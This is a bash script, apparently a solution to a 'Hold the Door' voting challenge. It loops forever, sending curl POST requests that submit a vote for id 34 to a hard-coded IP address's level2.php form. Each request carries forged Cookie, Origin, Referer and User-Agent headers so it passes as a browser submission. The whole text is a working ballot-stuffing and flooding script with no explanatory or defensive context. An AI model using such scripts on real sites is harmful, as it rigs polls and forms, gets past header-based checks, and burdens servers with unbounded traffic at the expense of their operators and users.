while :
do
  curl 'http://173.246.108.142/level2.php' -H 'Cookie: HoldTheDoor=1234' -H 'Origin: http://173.246.108.142' -H 'Accept-Encoding: gzip, deflate' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cache-Control: max-age=0' -H 'Referer: http://173.246.108.142/level2.php' --data 'id=34&holdthedoor=Submit&key=1234' --compressed
done
